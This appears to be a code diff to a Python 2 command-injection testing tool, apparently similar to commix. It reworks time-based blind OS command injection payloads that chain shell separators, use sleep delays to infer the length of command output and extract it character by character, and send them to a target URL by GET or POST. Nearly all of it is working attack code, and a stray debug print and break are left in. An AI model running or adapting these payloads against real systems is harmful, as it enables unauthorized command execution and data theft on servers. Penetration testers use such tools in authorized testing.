@@ -63,15 +63,11 @@ def exploitation(url,delay,filename,http_request_method):
   for prefix in settings.PREFIXES:
     for suffix in settings.SUFFIXES:
       for seperator in settings.SEPERATORS:
-	
+
 	# Check for bad combination of prefix and seperator
 	combination = prefix + seperator
 	if combination in settings.JUNK_COMBINATION:
 	  prefix = ""
-	
-  	# Encode (urlencode) prefixes and suffixes
-	encoded_prefix = urllib.quote_plus(prefix)
-	encoded_suffix = urllib.quote_plus(suffix)
 	
 	# Change TAG on every request to prevent false-positive resutls.
 	TAG = ''.join(random.choice(string.ascii_uppercase) for i in range(6))
@@ -90,135 +86,127 @@ def exploitation(url,delay,filename,http_request_method):
 			)
 	      
 	    elif seperator == "&&" :
-	      payload = (urllib.quote('&') + " " +
-			"sleep 0 " + urllib.quote(seperator) + " "
-			"str=$(echo "+TAG+")" + urllib.quote(seperator) + " "
+	      if http_request_method == "POST":
+		seperator = urllib.quote(seperator)
+		ampersand = urllib.quote("&")
+	      else:
+		ampersand = "&"
+	      payload = (ampersand + " " +
+			"sleep 0  " + seperator + " "
+			"str=$(echo "+TAG+") " + seperator + " "
 			# Find the length of the output.
-			"str1=${#str}" + urllib.quote(seperator) + " "
-			"[ " + str(j) + " -eq ${str1} ]" + urllib.quote(seperator) + " "
+			"str1=${#str} " + seperator + " "
+			"[ " + str(j) + " -eq ${str1} ] " + seperator + " "
 			"sleep 1 "
 			)
+	      if http_request_method == "POST":
+		seperator = urllib.unquote(seperator)
 
 	    elif seperator == "||" :
 	      payload = (seperator + " "
 			"echo '" + TAG + "' | "+ 
 			"[ "+str(j)+" -ne $(echo \""+TAG+"\" | wc -c) ] " + seperator + " "
-			"sleep " + str(delay)
+			"sleep " + str(delay) + " "
 			)  
 	    else:
-	      pass
+	      break
 
 	    # Check if defined "--prefix" option.
 	    if menu.options.prefix:
 	      prefix = menu.options.prefix
 	      payload = prefix + payload
-	      
 	    else:
-	      encoded_payload = encoded_prefix + payload
 	      payload = prefix + payload
-	      
+
 	    # Check if defined "--suffix" option.
 	    if menu.options.suffix:
 	      suffix = menu.options.suffix
 	      payload = payload + suffix
-	      
 	    else:
-	      encoded_payload = encoded_payload + encoded_suffix
 	      payload = payload + suffix
+	      
+	    # Check if defined "--verbose" option.
+	    if menu.options.verbose:
+	      if seperator == ";" or seperator == "&&" or seperator == "||":
+		sys.stdout.write("\n" + colors.GREY + payload + colors.RESET)
+
+	    start = 0
+	    end = 0
+	    start = time.time()
+	    
+	    # Check if defined method is GET (Default).
+	    if http_request_method == "GET":
+	      
+	      # Check if its not specified the 'INJECT_HERE' tag
+	      url = parameters.do_GET_check(url)
+	      
+	      # Encoding non-ASCII characters payload.
+	      payload = urllib.quote(payload)
+	      
+	      # Define the vulnerable parameter
+	      vuln_parameter = parameters.vuln_GET_param(url)
+		
+	      target = re.sub(settings.INJECT_TAG, payload, url)
+	      request = urllib2.Request(target)
+	      
+	      # Check if defined extra headers.
+	      headers.do_check(request)
+	      
+	      # Check if defined any HTTP Proxy.
+	      if menu.options.proxy:
+		try:
+		  proxy= urllib2.ProxyHandler({'http': menu.options.proxy})
+		  opener = urllib2.build_opener(proxy)
+		  urllib2.install_opener(opener)
+		  response = urllib2.urlopen(request)
+		  response.read()
+		  
+		except urllib2.HTTPError, err:
+		  print "\n(x) Error : " + str(err)
+		  sys.exit(1) 
 	  
-	    payload_list = []
-	    if payload != encoded_payload:
-	      payload_list.append(payload)
-	      payload_list.append(encoded_payload)
-	    else:
-	      payload_list.append(payload)
-	      
-	    for payload in payload_list:
-	      if urllib.unquote(payload) == payload:
-		is_encoded = True
-	
-	      # Check if defined "--verbose" option.
-	      if menu.options.verbose:
-		if seperator == ";" or seperator == "&&" or seperator == "||":
-		  sys.stdout.write("\n" + colors.GREY + payload + colors.RESET)
-
-	      start = 0
-	      end = 0
-	      start = time.time()
-	      
-	      # Check if defined method is GET (Default).
-	      if http_request_method == "GET":
-		
-		# Check if its not specified the 'INJECT_HERE' tag
-		url = parameters.do_GET_check(url)
-		
-		# Encoding non-ASCII characters payload.
-		payload = urllib.quote(payload)
-		
-		# Define the vulnerable parameter
-		vuln_parameter = parameters.vuln_GET_param(url)
-		  
-		target = re.sub(settings.INJECT_TAG, payload, url)
-		request = urllib2.Request(target)
-		
-		# Check if defined extra headers.
-		headers.do_check(request)
-		
-		# Check if defined any HTTP Proxy.
-		if menu.options.proxy:
-		  try:
-		    proxy= urllib2.ProxyHandler({'http': menu.options.proxy})
-		    opener = urllib2.build_opener(proxy)
-		    urllib2.install_opener(opener)
-		    response = urllib2.urlopen(request)
-		    response.read()
-		    
-		  except urllib2.HTTPError, err:
-		    print "\n(x) Error : " + str(err)
-		    sys.exit(1) 
-	    
-		else:
-		  response = urllib2.urlopen(request)
-		  response.read()
-		  
-	      # Check if defined method is POST.
 	      else:
-
-		parameter = menu.options.data
-		parameter = urllib2.unquote(parameter)
+		response = urllib2.urlopen(request)
+		response.read()
 		
-		# Check if its not specified the 'INJECT_HERE' tag
-		parameter = parameters.do_POST_check(parameter)
-		
-		# Define the POST data
-		data = re.sub(settings.INJECT_TAG, payload, parameter)
-		request = urllib2.Request(url, data)
-		
-		# Define the vulnerable parameter
-		vuln_parameter = parameters.vuln_POST_param(parameter,url)
-		
-		# Check if defined extra headers.
-		headers.do_check(request)
-		
-		# Check if defined any HTTP Proxy.
-		if menu.options.proxy:
-		  try:
-		    proxy= urllib2.ProxyHandler({'http': menu.options.proxy})
-		    opener = urllib2.build_opener(proxy)
-		    urllib2.install_opener(opener)
-		    response = urllib2.urlopen(request)
-		    response.read()
-		    
-		  except urllib2.HTTPError, err:
-		    print "\n(x) Error : " + str(err)
-		    sys.exit(1) 
-	    
-		else:
+	    # Check if defined method is POST.
+	    else:
+	      
+	      parameter = menu.options.data
+	      parameter = urllib2.unquote(parameter)
+	      
+	      # Check if its not specified the 'INJECT_HERE' tag
+	      parameter = parameters.do_POST_check(parameter)
+	      
+	      # Define the vulnerable parameter
+	      vuln_parameter = parameters.vuln_POST_param(parameter,url)
+	      
+	      # Define the POST data
+	      data = re.sub(settings.INJECT_TAG, payload, parameter)
+	      request = urllib2.Request(url, data)
+	      	      
+	      # Check if defined extra headers.
+	      headers.do_check(request)
+	      
+	      # Check if defined any HTTP Proxy.
+	      if menu.options.proxy:
+		try:
+		  proxy= urllib2.ProxyHandler({'http': menu.options.proxy})
+		  opener = urllib2.build_opener(proxy)
+		  urllib2.install_opener(opener)
 		  response = urllib2.urlopen(request)
 		  response.read()
-		      
-	      end  = time.time()
-	      how_long = int(end - start)
+		  
+		except urllib2.HTTPError, err:
+		  print "\n(x) Error : " + str(err)
+		  sys.exit(1) 
+	  
+	      else:
+		response = urllib2.urlopen(request)
+		response.read()
+		
+	    end  = time.time()
+	    how_long = int(end - start)
 
 	  except:
 	    continue
@@ -296,42 +284,42 @@ def exploitation(url,delay,filename,http_request_method):
 				  )
 				  
 		      if seperator == "&&" :
-			payload = (urllib.quote('&') + " " +
-				  "sleep 0 " + urllib.quote(seperator) + " "
-				  "str=$(\""+cmd+"\") " + urllib.quote(seperator) + " "
+			if http_request_method == "POST":
+			  seperator = urllib.quote(seperator)
+			  ampersand = urllib.quote("&")
+			else:
+			  ampersand = "&"
+			payload = (ampersand + " " +
+				  "sleep 0  " + seperator + " "
+				  "str=$(\""+cmd+"\")  " + seperator + " "
 				  # Find the length of the output.
-				  "str1=${#str} " + urllib.quote(seperator) + " "
-				  "[ " + str(j) + " -eq ${str1} ]" + urllib.quote(seperator) + " "
+				  "str1=${#str}  " + seperator + " "
+				  "[ " + str(j) + " -eq ${str1} ] " + seperator + " "
 				  "sleep 1 "
 				  )
-	    
+			if http_request_method == "POST":
+			  seperator = urllib.unquote(seperator)
+			  
 		      if seperator == "||" :
 			payload = (seperator + " "
 				  "echo '" + TAG + "' |"+ 
 				  "[ "+str(j)+" -ne $(\""+cmd+"\" | wc -c) ] " + seperator + 
 				  "sleep " + str(delay) + " "
 				  )
+			
 		      # Check if defined "--prefix" option.
 		      if menu.options.prefix:
 			prefix = menu.options.prefix
 			payload = prefix + payload
 		      else:
-			if is_encoded == True:
-			  payload = encoded_prefix + payload
-			else:
-			  payload = prefix + payload
-			
+			payload = prefix + payload
 		      # Check if defined "--suffix" option.
 		      if menu.options.suffix:
 			suffix = menu.options.suffix
 			payload = payload + suffix
 		      else:
-			if is_encoded == True:
-			  payload = payload + encoded_suffix
-			else:
-			  payload = payload + suffix
+			payload = payload + suffix
 			
-		      #payload = re.sub(" ", "%20", payload)
 		      # Check if defined "--verbose" option.
 		      if menu.options.verbose:
 			sys.stdout.write("\n" + colors.GREY + payload + colors.RESET)
@@ -434,13 +422,20 @@ def exploitation(url,delay,filename,http_request_method):
 				    )
 
 			if seperator == "&&" :
-			  payload = (urllib.quote('&') + " " +
-				    "sleep 0 " + urllib.quote(seperator) + " "
-				    "str=$(" + cmd + "|tr '\n' ' '|cut -c " + str(i) + "|od -N 1 -i|head -1|tr -s ' '|cut -d ' ' -f 2)" + urllib.quote(seperator) + " "
-				    "[ " + str(ascii_char) + " -eq ${str} ]" + urllib.quote(seperator) + " "
+			  if http_request_method == "POST":
+			    seperator = urllib.quote(seperator)
+			    ampersand = urllib.quote("&")
+			  else:
+			    ampersand = "&"
+			  payload = (ampersand + " " +
+				    "sleep 0  " + seperator + " "
+				    "str=$(" + cmd + "|tr '\n' ' '|cut -c " + str(i) + "|od -N 1 -i|head -1|tr -s ' '|cut -d ' ' -f 2) " + seperator + " "
+				    "[ " + str(ascii_char) + " -eq ${str} ] " + seperator + " "
 				    "sleep 1 "
 				    )
-
+			  if http_request_method == "POST":
+			    seperator = urllib.unquote(seperator)
+		
 			if seperator == "||" :
 			  payload = (seperator + " "
 				    "echo '" + TAG + "' |"+
@@ -452,23 +447,12 @@ def exploitation(url,delay,filename,http_request_method):
 			if menu.options.prefix:
 			  prefix = menu.options.prefix
 			  payload = prefix + payload
-			else:
-			  if is_encoded == True:
-			    payload = encoded_prefix + payload
-			  else:
-			    payload = prefix + payload
 			  
 			# Check if defined "--suffix" option.
 			if menu.options.suffix:
 			  suffix = menu.options.suffix
 			  payload = payload + suffix
-			else:
-			  if is_encoded == True:
-			    payload = payload + encoded_suffix
-			  else:
-			    payload = payload + suffix
-			
-			#payload = re.sub(" ", "%20", payload)
+
 			# Check if defined "--verbose" option.
 			if menu.options.verbose:
 			  sys.stdout.write("\n" + colors.GREY + payload + colors.RESET)
@@ -558,6 +542,9 @@ def exploitation(url,delay,filename,http_request_method):
 		  sys.exit(0)
 
 	    else:
+	      print j
+	      if j == 6:
+		break
 	      print "(*) Continue testing the "+ technique +"... "
 	      break
 	  
